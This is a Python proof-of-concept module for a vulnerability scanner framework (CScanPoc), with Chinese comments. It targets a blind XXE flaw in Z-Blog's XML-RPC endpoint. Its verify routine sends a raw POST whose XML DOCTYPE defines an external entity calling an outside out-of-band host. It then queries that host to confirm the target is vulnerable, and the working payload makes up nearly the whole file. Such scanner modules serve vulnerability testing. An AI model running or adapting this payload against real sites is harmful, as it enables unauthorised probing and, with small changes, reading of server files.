# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()


class Vuln(ABVuln):
    vuln_id = 'Zblog_0007'  # 平台漏洞编号，留空
    name = 'Zblog Blind-XXE造成任意文件读取'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.LFI  # 漏洞类型
    disclosure_date = '2015-06-02'  # 漏洞公布时间
    desc = '''
        Z-Blog是由RainbowSoft Studio开发的一款小巧而强大的基于Asp和PHP平台的开源程序，其创始人为朱煊(网名：zx.asd)。
        Zblog /zb_system/xml-rpc/index.php Blind-XXE  造成任意文件读取漏洞。
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=098591'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Zblog'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '5ee27c31-133a-46e7-9230-c0a8fe1990f7'
    author = '国光'  # POC编写者
    create_date = '2018-05-13'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            payload = '/zb_system/xml-rpc/index.php'
            url = '{target}'.format(target=self.target)+payload
            raw = '''POST /zb_system/xml-rpc/index.php HTTP/1.1
Content-Length: 182
Connection: Keep-Alive
Accept: */*
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
Host: liushumeng.com
Content-Type: application/x-www-form-urlencoded

<?xml version="1.0" encoding="UTF-8" standalone="no" ?><!DOCTYPE root [<!ENTITY % remote SYSTEM "http://pysandbox.sinaapp.com/kv?act=set&k={key}&v=testvul">%remote;]></root>'''
            key = arg.replace('http://', '').replace('/', '').replace(':', '')
            code, head, res, errcode, _ = hh.http(
                url, raw=raw.replace('{key}', key))
            keyurl = 'http://pysandbox.sinaapp.com/kv?act=get&k=%s' % (key)
            code, head, res, errcode, _ = hh.http(keyurl)

            if 'testvul' in res:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
